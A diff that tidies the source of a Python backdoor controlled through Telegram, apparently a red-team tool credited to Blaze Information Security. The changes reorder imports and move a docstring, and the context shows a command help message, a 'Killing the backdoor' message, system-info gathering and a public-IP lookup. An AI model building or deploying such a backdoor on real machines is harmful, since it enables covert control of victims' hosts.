@@ -6,15 +6,15 @@
 # Copyright 2016, Blaze Information Security
 # https://www.blazeinfosec.com
 
-import os
+import base64
 import ctypes
-import platform
 import getpass
+import os
+import platform
+import re
 import socket
 import subprocess
 import urllib2
-import re
-import base64
 
 help_message = """
 Available commands are:
@@ -32,6 +32,7 @@ Available commands are:
 notimplemented_message = "This command has not been implemented yet."
 uploadfunctionality_message = "Use Telegram's built-in functionality for this purpose."
 suicide_message = "Killing the backdoor..."
+
 
 def parse_command(cmd):
     if cmd.startswith('/'):
@@ -91,10 +92,11 @@ def get_system_info():
     return system_info
 
 
-''' Generic get public IP function using DynDNS from http://bit.ly/1QvILBT
-    Using urllib2 just to make sure it works in most Python installs
-'''
 def get_public_ip():
+    '''
+    Generic get public IP function using DynDNS from http://bit.ly/1QvILBT
+    Using urllib2 just to make sure it works in most Python installs
+    '''
     ip = ""
     try:
         response = urllib2.urlopen('http://checkip.dyndns.com/')
@@ -109,9 +111,11 @@ def get_internal_ip():
     ''' NOT IMPLEMENTED YET '''
     return
 
+
 def windows_getip():
     ''' NOT IMPLEMENTED YET '''
     return
+
 
 def linux_getip():
     ''' NOT IMPLEMENTED YET '''
